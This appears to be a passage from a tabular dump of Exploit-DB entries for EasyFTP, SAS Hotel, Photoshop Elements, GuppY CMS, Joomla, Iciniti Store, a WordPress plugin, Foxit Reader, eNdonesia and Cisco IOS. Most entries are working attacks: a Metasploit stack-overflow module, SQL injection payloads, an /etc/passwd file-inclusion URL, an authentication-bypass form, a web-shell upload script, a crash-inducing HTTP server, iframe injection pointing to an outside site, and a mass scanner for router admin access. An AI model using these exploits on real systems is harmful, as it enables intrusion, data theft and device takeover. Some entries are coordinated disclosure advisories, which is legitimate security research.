NULL,CONCAT(0x716b787071,0x506961776c6f79515068694b454e736668707675627448527949566e434472706a72624a466a5468,0x7171627171)-- LEhA&rctyp=Products ================== 8bitsec - [https://twitter.com/_8bitsec]",remote,webapps,1
16771,"EasyFTP Server 1.7.0.11 - list.html path Stack Buffer Overflow (Metasploit) ## # $Id: easyftp_list.rb 10024 2010-08-17 01:35:03Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	HttpFingerprint = { :pattern => [ /Easy-Web Server\// ] }  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'EasyFTP Server <= 1.7.0.11 list.html path Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11 				and earlier. EasyFTP fails to check input size when parsing the 'path' parameter 				supplied to an HTTP GET request, which leads to a stack based buffer overflow. 				EasyFTP allows anonymous access by default; valid credentials are typically 				unnecessary to exploit this vulnerability.  				After version 1.7.0.12, this package was renamed ""UplusFtp"".  				Due to limited space, as well as difficulties using an egghunter, the use of 				staged, ORD, and/or shell payloads is recommended. 			}, 			'Author'         => 				[ 					'ThE g0bL!N',   # Original exploit [see References] 					'jduck'         # Metasploit re-implementation 				], 			'Version'        => '$Revision: 10024 $', 			'References'     => 				[ 					[ 'OSVDB', '66614'], 					[ 'URL', 'http://www.exploit-db.com/exploits/11500/' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread' 				}, 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 256, 					'BadChars' => ""\x00\x09\x0a\x0b\x0c\x0d\x20\x23\x25\x26\x2b\x2f\x3b\x3f\x5c"", 					'Compat'   => 					{ 						'ConnectionType' => '+ws2ord', 					}, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[	'Windows XP SP3 - Easy FTP Server Universal', 						# NOTE: It's not possible to use addresses within the 						# binary due to the nul byte. 						{ 							'Ret'      => 0x7cc5d507  # jmp esp in shell32.dll 							#'Ret'      => 0xdeadbeef 						} 					] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Feb 18 2010' 		))  		register_options( 			[ 				Opt::RPORT(8080), 				OptString.new('BasicAuthUser', [true, 'The HTTP username to specify for basic authentication', 'anonymous']), 				OptString.new('BasicAuthPass', [true, 'The HTTP password to specify for basic authentication', 'mozilla@example.com']), 			], self.class) 	end  	def check 		info = http_fingerprint  # check method 		if info and (info =~ /Easy-Web Server\//) 			return Exploit::CheckCode::Vulnerable 		end 		Exploit::CheckCode::Safe 	end   	def exploit 		if (payload.encoded.length > payload_space) 			raise RuntimeError, ""Insufficient space for payload, try using a staged, ORD and/or shell payload."" 		end  		# Fix up ESP, jmp to the beginning of the buffer 		stub_asm = %q{ 			mov edi, esp 			add esp, 0xfffffc04 			add edi, 0xfffffee8 			jmp edi 		} 		stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub_asm).encode_string  		# Build the path up 		path = '' 		path << payload.encoded 		path << rand_text(268 - path.length) 		# NOTE: It's possible to overwrite SEH, however SafeSEH is in effect. 		path << [target.ret].pack('V') 		path << rand_text(280 - path.length) 		path << stub 		path << rand_text(332 - path.length)  		uri = ""/list.html?path="" 		uri << path  		print_status(""Trying target #{target.name}..."") 		res = send_request_raw({ 'uri' => uri }, 5)  		if (res) 			print_error(""The server unexpectedly responded, this is not good."") 			print_status(res.inspect) 		end  		handler 	end  end",remote,remote,1
13882,"SAS Hotel Management System - 'notfound' SQL Injection 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-0 0 _ __ __ __ 1 1 /' \ __ /'__`\ /\ \__ /'__`\ 0 0 /\_, \ ___ /\_\/\_\ \ \ ___\ \ ,_\/\ \/\ \ _ ___ 1 1 \/_/\ \ /' _ `\ \/\ \/_/_\_<_ /'___\ \ \/\ \ \ \ \/\`'__\ 0 0 \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/ 1 1 \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\ 0 0 \/_/\/_/\/_/\ \_\ \/___/ \/____/ \/__/ \/___/ \/_/ 1 1 \ \____/ >> Exploit database separated by exploit 0 0 \/___/ type (local, remote, DoS, etc.) 1 1 1 0 [+] Site : Inj3ct0r.com 0 1 [+] Support e-mail : submit[at]inj3ct0r.com 1 0 0 1 ########################################## 1 0 I'm L0rd CrusAd3r member from Inj3ct0r Team 1 1 ########################################## 0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1  Author: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com] Exploit Title:SAS Hotel Management System SQL Vulnerable Vendor url:http://www.sellatsite.com Version:n/a Price:28$ Published: 2010-06-15 Greetz to:Sid3^effects, MaYur, M4n0j, Dark Blue, S1ayer,d3c0d3r,KD and to all ICW members. Spl Greetz to:inj3ct0r.com Team, Andhrahackers.com  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Description:  SAS Hotel Management System reservation portal. Agents, Hotel and Resorts owner can submit their hotels and resorts for booking. Email alerts on rooms or resorts reservation for both buyer and owner. Website owner hotels and resort listings will appear always on the top of the list. Website owner hotels and resorts photo gallery. Agents and hotel owners can submit images during registration. Powerful admin to control register hotels, agents and their payments. 2Checkout, Paypal and Manual payment options.  Note: Listings submitted for UAE only you can start checking script by registering your own hotel or resort.    ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Vulnerability:  *SQLi Vulnerability  DEMO URL :http://server/home/user_login.asp?notfound=[sqli]  # 0day n0 m0re # # L0rd CrusAd3r #  --  With R3gards, L0rd CrusAd3r",remote,webapps,1
17918,"Adobe Photoshop Elements 8.0 - Multiple Arbitrary Code Execution Vulnerabilities Title: ------ Adobe Photoshop Elements 8.0 Multiple Arbitrary Code Execution Vulnerabilities     Vendor: ------- Adobe Systems Inc. (http://www.adobe.com)   Product web page: ----------------- http://www.adobe.com/products/photoshop-elements.html   Affected version: ----------------- 8.0 and 7.0 (20080916r.508356)   Summary: -------- Adobe Photoshop Elements - the No.1 consumer photo editing software that helps you turn everyday memories into sensational photos you'll cherish forever. Easily edit photos and make photo creations using automated options, share photos with your social network, and view photos virtually anywhere you are.   Description: ------------ Photoshop Elements 8 suffers from a buffer overflow vulnerability when dealing with .ABR (brushes) and .GRD (gradients) format files. The application fails to sanitize the user input resulting in a memory corruption, overwriting several memory registers which can aid the atacker to gain the power of executing arbitrary code on the affected system or denial of service scenario.   WinDBG output: -------------------------------------------------------------------- .abr: ----- (cd8.d98): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0de318d0 ebx=41414141 ecx=06260000 edx=00004141 esi=0de318c8 edi=41414141 eip=7c919064 esp=0012d784 ebp=0012d9a0 iopl=0         nv up ei ng nz na pe cy cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210287 ntdll!RtlDosSearchPath_Ustr+0x473: 7c919064 8b0b            mov     ecx,dword ptr [ebx]  ds:0023:41414141=????????  .grd: ----- (d1c.404): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=7efefefe ebx=00414141 ecx=00104d35 edx=41414141 esi=0f0e0c90 edi=0de5d000 eip=781807f5 esp=0012d9e8 ebp=033052a0 iopl=0         nv up ei pl zr na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246  --------------------------------------------------------------------   Tested on: ---------- Microsoft Windows XP Professional Service Pack 3 (English)   Vulnerability discovered by: ---------------------------- Gjoko 'LiquidWorm' Krstic Zero Science Lab (http://www.zeroscience.mk) liquidworm gmail com   Vendor status: -------------- [22.09.2009] Vulnerabilities discovered. [09.03.2010] Sent detailed info to the vendor with PoC files. [09.03.2010] Vendor responds with assigned tracking numbers of the issues. [21.03.2010] Asked vendor for confirmation. [21.03.2010] Vendor replies confirming the vulnerabilities. [03.06.2011] Asked vendor for scheduled patch release date. [05.06.2011] Vendor replies with a scheduled timeframe. [02.09.2011] Asked vendor for an exact patch release date. [03.09.2011] Vendor replies. [09.09.2011] Asked vendor for assigned advisory ID. [10.09.2011] Vendor tags their Adobe Advisory ID: APSA11-03. [01.10.2011] Coordinated public security advisory released.   Advisory details: ----------------- Advisory ID: ZSL-2011-5049 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5049.php  Adobe Advisory ID: APSA11-03 Adobe Advisory URL: http://www.adobe.com/support/security/advisories/apsa11-03.html Adobe PSIRT ID: 447,448  CVE ID: CVE-2011-2443 CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2443  CWE ID: CWE-120 CWE URL: http://cwe.mitre.org/data/definitions/120.html  REF #1: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4939.php REF #2: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4940.php   Proof Of Concept: ----------------- http://www.zeroscience.mk/codes/brush_gradiently.rar (11071 bytes) https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/17918.rar (brush_gradiently.rar)",remote,dos,1
36098,"Guppy CMS 5.0.9/5.00.10 - Authentication Bypass/Change Email <!--  Exploit Title: GuppY CMS 5.0.9 & 5.00.10 Authentication bypass/Change email. Other versions may be vulnerable but weren't tested. Date: 2/17/2015 Exploit Author: Brandon Murphy Vendor Homepage: http://freeguppy.org Software Link: Windows-5.00.10 https://www.freeguppy.org/dwnld.php?lng=en&delay=5&pg=255317&li=CeCILL Version: 5.0.9 & 5.00.10 Tested on: Windows 7/Firefox & Xubuntu Linux 3.2.0-23-generic Xubuntu - Guppy CMS 5.00.10 VM: http://mediafire.com/download/d85mgobb35mblzb/GUPPY5.0.7z Working on Virtualbox & VMWare Workstation - VM by d1ch4do Username:xubuntu Pass:reverse  Timeline: 12/21/2014 Notified vendor of vulnerability. 12/21/2014 Vendor replied requesting information. 12/22/2014 Vendor notified of another vulnerability. Supplied both exploits/info. 12/23/2014 Vendor replied problem identified. I was told that I would be supplied with corrections when patch is ready. 12/23/2014 Acknowledged. Told vendor full disclosure will be released 45 days after patch release. 12/29/2014 Vendor releases 5.00.10. Countdown begins. 1/1/2015 Vendor notified the vulnerabilities still exist in patched version 5.00.10 1/2/2015 Vendor supplied with version 2 exploits. 2/17/2015 Public Disclosure. Was delayed due to holiday.  Exploit Description: This exploit will automatically log you in and change the email to any registered user except for the admin that is installed with the web application. Click on ""Become a member"" on the target website to insert the appropriate cookies for this to work. Once the exploit takes place proceed to click ""Modify"" and change the password. To see if the user has some sort of admin privileges go to site.com/admin/ while still logged in. If they do it will say ""Vic_username, enter your password:"" and login with the password you just changed it to.  Disclaimer: I cannot be held accountable for anything you do with this exploit. You take responsibility for your own actions. For educational and testing purposes only. -->  <html>   <body bgcolor=""#000000"">  <font face=""arial"" color=""#01DF01"" size=""5"">  <center>  GuppY CMS 5.0.9 & 5.00.10 Authentication bypass/Change email. Other versions may be vulnerable but weren't tested.<br>  Stable with Firefox 34.0.5. Other browsers may be unstable or may not work.<br><br><br>  Thanks: Fred, d1ch4do, & to all of the people who don't believe in me.<br>  <a href=""https://linkedin.com/in/brandonm86"">My LinkedIn</a><br>-----------------------------------------------------------------------------------</font>   <body>     <form action=""http://website.com/user.php?lng=en"" method=""POST""> <!-- Change this action to http://website.com/user.php?lng=en&uuser=new to work with 5.00.10. -->       <input type=""hidden"" name=""token"" value=""131095497e5f9d22882.83937400""/> <!-- Click on become a member. View the source then search for ""token"" and replace this value. Remove this line to work with 5.00.10 -->       <input type=""hidden"" name=""setusercookie"" value=""1""/>       <input type=""hidden"" name=""uuser"" value=""update""/> <!-- Wet paint. Don't touch! -->       <input type=""hidden"" name=""code_pseudo"" value=""""/>       <input type=""text"" name=""upseudo"" value=""Vic Username""/><br><br> <!-- User to login as. Can be any registered user with(out) special privileges. -->       <input type=""text"" name=""uuid"" value=""Password""/><br><br> <!-- Anything you like as you will change the password to what you want after the exploit succeeds. -->       <input type=""text"" name=""uuid2"" value=""Verify Password""/><br><br>       <input type=""text"" name=""uemail"" value=""Your Email""/><br><br><br> <!-- Email will be changed to the one you provide. -->       <input type=""hidden"" name=""uwebsite"" value=""http://""/>       <input type=""hidden"" name=""usign"" value=""""/>       <input type=""hidden"" name=""uimgsign"" value=""http://""/>       <input type=""hidden"" name=""ulang"" value=""en""/>       <input type=""hidden"" name=""udesign"" value=""""/>       <input type=""hidden"" name=""uboxes"" value=""LR""/>       <input type=""hidden"" name=""uextavatar"" value=""http://""/>       <input type=""submit"" value=""Enjoy the ride!""/></center>     </form>   </body> </html>",remote,webapps,1
35097,Joomla! Component com_redirect 1.5.19 - Local File Inclusion source: https://www.securityfocus.com/bid/45364/info  The 'com_redirect' component for Joomla! is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the underlying computer; other attacks are also possible.  Joomla Redirect 1.5.19 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?option=com_redirect&view=../../../../../../../../../etc/passwd%00,local,webapps,0
18566,"Iciniti Store - SQL Injection Sense of Security - Security Advisory - SOS-12-003 Release Date.                   06-Mar-2012 Last Update.                    - Vendor Notification Date.       28-Jul-2011 Product.                        Iciniti Store Platform.                       Windows Affected versions.              4.3.3683.31484 verified, and possibly                                  others Severity Rating.                High Impact.                         Manipulation of data Attack Vector.                  Remote without authentication Solution Status.                Update is available by contacting                                  Iciniti CVE reference.                  CVE - not yet assigned  Details. Iciniti Store is a web application providing e-commerce and payment  solutions. The application suffers from a SQL injection vulnerability  in logon_forgot_password.aspx. It fails to validate data supplied in  the 'ctlEmail' variable before being used in an SQL query.  Proof of Concept. <html> <head></head> <body onLoad=javascript:document.form.submit()> <form action="" http://x.x.x.x/logon_forgot_password.aspx"" name=""form""  method=""POST""> <input type=""text"" name=""ctlEmail"" value=""SELECT @@VERSION""> <input type=""text"" name=""btnSubmit"" value=""Submit"">  </form> </body> </html>  Solution. Update is available by contacting Iciniti.  Discovered by. Sense of Security Labs.  About us. Sense of Security is a leading provider of information security and  risk management solutions. Our team has expert skills in assessment and assurance, strategy and architecture, and deployment through to ongoing management. We are Australia's premier application penetration  testing firm and trusted IT security advisor to many of the country's largest organisations.  Sense of Security Pty Ltd  Level 8, 66 King St Sydney NSW 2000 AUSTRALIA  T: +61 (0)2 9290 4444 F: +61 (0)2 9290 4455 W: http://www.senseofsecurity.com.au E: info@senseofsecurity.com.au Twitter: @ITsecurityAU  The latest version of this advisory can be found at: http://www.senseofsecurity.com.au/advisories/SOS-12-003.pdf  Other Sense of Security advisories can be found at: http://www.senseofsecurity.com.au/research/it-security-advisories.php",remote,webapps,1
19056,"WordPress Plugin Mac Photo Gallery 2.7 - Arbitrary File Upload ########################################################### # # Exploit Title: Wordpress Mac Photo Gallery 2.7 Arbitrary File Upload # Google Dork: inurl:wp-content/plugins/mac-dock-gallery/ # Date: 11/06/2012 # Exploit Author: Adrien Thierry # Vendor Homepage:  http://www.apptha.com # Software Link: http://downloads.wordpress.org/plugin/mac-dock-gallery.2.7.zip # Version: 2.7 # ###########################################################  Vuln page : http://mysite.com/wp-content/plugins/mac-dock-gallery/upload-file.php  exploit :  <?php $u=""C:\Program Files (x86)\EasyPHP-5.3.9\www\shell.php""; $c = curl_init(""http://127.0.0.1/wordpress/wp-content/plugins/mac-dock-gallery/upload-file.php""); curl_setopt($c, CURLOPT_POST, true); curl_setopt($c, CURLOPT_POSTFIELDS, array('uploadfile'=>""@$u"", 'albumId'=>""1"", 'mode'=>""image"")); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $e = curl_exec($c); curl_close($c); echo $e;  ?>  shell access : http://mysite.com/wp-content/uploads/mac-dock-gallery/shell.php  #####################################################################",remote,webapps,1
23944,"Foxit Reader 5.4.4.1128 Firefox Plugin - 'npFoxitReaderPlugin.dll' Stack Buffer Overflow (PoC) <?php /* Foxit Reader <= 5.4.4.1128 Plugin for Firefox npFoxitReaderPlugin.dll Overlong  Query String Remote Stack Buffer Overflow PoC --------------------------- rgod  (listener)  Tested against Microsoft Windows Mozilla Firefox 17.0.1 Foxit Reader 5.4.3.0920 Foxit Reader 5.4.4.1128  File: npFoxitReaderPlugin.dll Version: 2.2.1.530  Product url: http://www.foxitsoftware.com/downloads/ Last version setup file: FoxitReader544.11281_enu_Setup.exe  Usage: Launch from the command line, then browse port 6666 with Firefox. You can test it also through this url:  http://192.168.0.1/x.pdf?[A x 1024]  File must be existing or the server should be responding with the proper Content-Type header.  vulnerable code, npFoxitReaderPlugin.dll:  ;------------------------------------------------------------------------------  L1000162F:   		push	ebx   		push	esi   		push	edi   		mov	edi,ebp   		or	ecx,FFFFFFFFh   		xor	eax,eax   		xor	ebx,ebx   		xor	esi,esi   		repne scasb   		not	ecx   		dec	ecx   		test	ecx,ecx   		jle	L100016E4  L1000164A:   		mov	al,[esi+ebp]   		mov	word ptr [esp+18h],0000h   		cmp	al,25h   		jz 	L10001661   		mov	ecx,[esp+1Ch]   		mov	[ebx+ecx],al   		jmp	L100016CE  L10001661:   		mov	al,[esi+ebp+01h]   		cmp	al,30h   		jl 	L1000166D   		cmp	al,39h   		jle	L1000167D  L1000166D:   		cmp	al,41h   		jl 	L10001675   		cmp	al,46h   		jle	L1000167D  L10001675:   		cmp	al,61h   		jl 	L100016C6   		cmp	al,66h   		jg 	L100016C6  L1000167D:   		mov	dl,[esi+ebp+01h]   		inc	esi   		inc	esi   		lea	ecx,[esp+10h]   		mov	[esp+18h],dl   		push	ecx   		mov	al,[esi+ebp]   		lea	edx,[esp+1Ch]   		push	L100450D4   		push	edx   		mov	[esp+25h],al   		call	SUB_L10006421   		mov	eax,[esp+1Ch]   		lea	ecx,[esp+24h]   		push	eax   		push	L100450D0   		push	ecx   		call	SUB_L100063CF   		mov	eax,[esp+34h]   		mov	dl,[esp+30h]   		add	esp,00000018h   		mov	[ebx+eax],dl   		jmp	L100016CE  L100016C6:   		mov	ecx,[esp+1Ch]   		mov	byte ptr [ebx+ecx],25h  L100016CE:   		inc	ebx   		mov	edi,ebp   		or	ecx,FFFFFFFFh   		xor	eax,eax   		inc	esi   		repne scasb   		not	ecx   		dec	ecx   		cmp	esi,ecx   		jl 	L1000164A  L100016E4:   		mov	edx,[esp+1Ch]   		pop	edi   		pop	esi   		mov	eax,00000001h   		mov	byte ptr [ebx+edx],00h   		pop	ebx   		pop	ebp   		pop	ecx   		retn ;------------------------------------------------------------------------------  this copy loop ends up in overwriting stack pointers, then  (by attaching to plugin-container.exe):  (f48.1778): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0076ed4c ebx=00000341 ecx=002cf414 edx=002cf414 esi=41414141 edi=0076e9e8 eip=10016852 esp=002cf3f8 ebp=75eacdf8 iopl=0         nv up ei pl nz na po nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202 npFoxitReaderPlugin!NP_GetEntryPoints+0x15672: 10016852 8906            mov     dword ptr [esi],eax  ds:0023:41414141=???????? ... Attempt to write to address 41414141 ...  also SEH pointers are overwritten */  error_reporting(0);  set_time_limit(0);  $port = 6666;  $____redirect = ""HTTP/1.1 301 Moved Permanently\r\n"".                 ""Server: Apache\r\n"".                 ""Location: /x.pdf?"".str_repeat(""A"",1024).""\r\n"".                 ""Content-Type: text/html\r\n\r\n"";  $____boom     = ""HTTP/1.1 200 OK\r\n"".                 ""Server: Apache\r\n"".                 ""Accept-Ranges: bytes\r\n"".                 ""Content-Length: 60137\r\n"".                 ""Content-Type: application/pdf\r\n"".                 ""Connection: keep-alive\r\n\r\n"";  $socket = stream_socket_server(""tcp://0.0.0.0:"".$port, $errno, $errstr);  if (!$socket) {   echo ""$errstr ($errno)\n""; } else {   echo ""Listening on public tcp port "".$port."" \n"";     while ($conn = stream_socket_accept($socket)) {     $line=fgets($conn);     echo $line.""\n"";     if (strpos($line,"".pdf"")){       fwrite($conn,$____boom);     }     else {       fwrite($conn,$____redirect);     }     fclose($conn);   }   fclose($socket); } ?>",remote,dos,1
46559,"eNdonesia Portal 8.7 - Multiple Vulnerabilities =========================================================================================== # Exploit Title: eNdonesia Portal 'banners.php' SQL Inj. # Dork: N/A # Date: 19-03-2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: http://www.endonesia.org/ # Software Link: https://sourceforge.net/projects/endonesia/ # Version: v8.7 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: eNdonesia ia a portal software, content management system (CMS) site management system , online publishing system, or whatever you want to name it. For internet, intranet, or on your own PC. =========================================================================================== # POC - SQLi # Parameters : bid, banners.php # Attack Pattern : -1+or+1%3d1+and+(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a) # GET Method : http://localhost/endonesia87/banners.php?op=click&bid=-1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a) =========================================================================================== ########################################################################################### =========================================================================================== # Exploit Title: eNdonesia Portal 'user.php' SQL Inj. # Dork: N/A # Date: 19-03-2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: http://www.endonesia.org/ # Software Link: https://sourceforge.net/projects/endonesia/ # Version: v8.7 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: eNdonesia ia a portal software, content management system (CMS)   site management system , online publishing system, or whatever you want to name it.   For internet, intranet, or on your own PC. =========================================================================================== # POC - SQLi # Parameters : email, user.php # Attack Pattern : 1'+OR+1=1+OR+'cw'='cw # POST Method : http://localhost/endonesia87/user.php =========================================================================================== ########################################################################################### =========================================================================================== # Exploit Title: eNdonesia Portal 'admin.php' SQL Inj. # Dork: N/A # Date: 19-03-2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: http://www.endonesia.org/ # Software Link: https://sourceforge.net/projects/endonesia/ # Version: v8.7 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: eNdonesia ia a portal software, content management system (CMS)   site management system , online publishing system, or whatever you want to name it.   For internet, intranet, or on your own PC. =========================================================================================== # POC - SQLi # Parameters : bid, admin.php # Attack Pattern : -1+or+1%3d1+and+(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a) # GET Method : http://localhost/endonesia87/admin.php?op=BannerDelete&bid=-1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)&ok=3 ===========================================================================================  =========================================================================================== # Exploit Title: eNdonesia Portal 'bid' Frame Inj. # Dork: N/A # Date: 19-03-2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: http://www.endonesia.org/ # Software Link: https://sourceforge.net/projects/endonesia/ # Version: v8.7 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: eNdonesia ia a portal software, content management system (CMS) site management system , online publishing system, or whatever you want to name it. For internet, intranet, or on your own PC. =========================================================================================== # POC - Frame Inj. # Parameters : bid, admin.php # Attack Pattern : %3ciframe+src%3d%22http%3a%2f%2fCyber-Warrior.org%2f%3f%22%3e%3c%2fiframe%3e # GET Method : http://localhost/endonesia87/admin.php?op=BannerDelete&bid=<iframe src=""http://Cyber-Warrior.org/?""></iframe>&ok=3 =========================================================================================== ########################################################################################### =========================================================================================== # Exploit Title: eNdonesia Portal 'fname' Frame Inj. # Dork: N/A # Date: 19-03-2019 # Exploit Author: Mehmet EMIROGLU # Vendor Homepage: http://www.endonesia.org/ # Software Link: https://sourceforge.net/projects/endonesia/ # Version: v8.7 # Category: Webapps # Tested on: Wamp64, Windows # CVE: N/A # Software Description: eNdonesia ia a portal software, content management system (CMS) site management system , online publishing system, or whatever you want to name it. For internet, intranet, or on your own PC. =========================================================================================== # POC - Frame Inj. # Parameters : fname, admin.php, comments # Attack Pattern : %3ciframe+src%3d%22http%3a%2f%2fCyber-Warrior.org%2f%3f%22%3e%3c%2fiframe%3e # POST Method : http://localhost/endonesia87/friend.php =========================================================================================== ###########################################################################################",remote,webapps,1
20977,"Cisco IOS 11.x/12.x - HTTP Configuration Arbitrary Administrative Access (3) # source: https://www.securityfocus.com/bid/2936/info #    # IOS is router firmware developed and distributed by Cisco Systems. IOS functions on numerous Cisco devices, including routers and switches. #    # It is possible to gain full remote administrative access on devices using affected releases of IOS. By using a URL of http://router.address/level/$NUMBER/exec/.... where $NUMBER is an integer between 16 and 99, it is possible for a remote user to gain full administrative access. #    # This problem makes it possible for a remote user to gain full administrative privileges, which may lead to further compromise of the network or result in a denial of service.  #   #!/usr/bin/perl # # Bulk Scanner for the Cisco IOS HTTP Configuration Arbitrary # Administrative Access Vulnerability # Found: 06-27-01 - Bugtraq ID: 2936 # Written by hypoclear on 07-03-01 # # usage: ./IOScan.pl <start ip> <end ip> # Note: start and end ip must be a Class B or C network # example: ./IOScan 192.168.0.0 192.168.255.255 # # hypoclear - hypoclear@jungle.net - http://hypoclear.cjb.net # This and all of my programs fall under my disclaimer, which # can be found at: http://hypoclear.cjb.net/hypodisclaim.txt  use IO::Socket;   die ""\nusage: $0 <start ip> <end ip> Note:  start and end ip must be a Class B or C network ex:   ./IOScan 192.168.0.0 192.168.255.255\n\n"" unless @ARGV > 0; $num = 16; $ipcount = 0; $vuln = 0;  if (defined $ARGV[1])  { $currentIP = $ARGV[0]; $endIP = $ARGV[1];    while(1)     { @CURIP = split(/\./,$currentIP);       if (($CURIP[2] > 255) && ($CURIP[3] > 255))        { scanEnd();        }       print ""Scanning $currentIP\n"";       scan($currentIP);       if ($currentIP eq $endIP)        { scanEnd();        }       if ($CURIP[3] < 255)        { $CURIP[3]++;        }       else        { $CURIP[2]++;          $CURIP[3]=0;        }       $currentIP = """";       foreach $item (@CURIP)         { $currentIP .= ""$item."";         }       $currentIP =~ s/\.$//;       $ipcount++;      }  }   sub scan   { while ($num <100)       { $IP = $_[0];         sender(""GET /level/$num/exec/- HTTP/1.0\n\n"");         if ($webRecv =~ /200 ok/)          { $vuln++;            open(OUT,"">>ios.out"") || die ""Can't write to file"";            print OUT ""$IP is Vulnerable\n"";            close(OUT);            $num = 101;          }         $num++;       }      $num = 16;   }   sub sender   { $sendsock = IO::Socket::INET -> new(Proto     => 'tcp',                                         PeerAddr  => $IP,                                         PeerPort  => 80,                                         Type      => SOCK_STREAM,                                         Timeout   => 1);         unless($sendsock){die ""Can't connect to $ARGV[0]""}    $sendsock->autoflush(1);     $sendsock -> send($_[0]);    $webRecv = """"; while(<$sendsock>){$webRecv .= $_} $webRecv =~ s/\n//g;    close $sendsock;   }   sub scanEnd   { print ""\nScanned $ipcount ip addresses, $vuln addresses found vulnerable.\n"";     if ($vuln > 0) {print ""Check ios.out for vulnerable addresses."";}     die ""\n"";   }",remote,remote,1
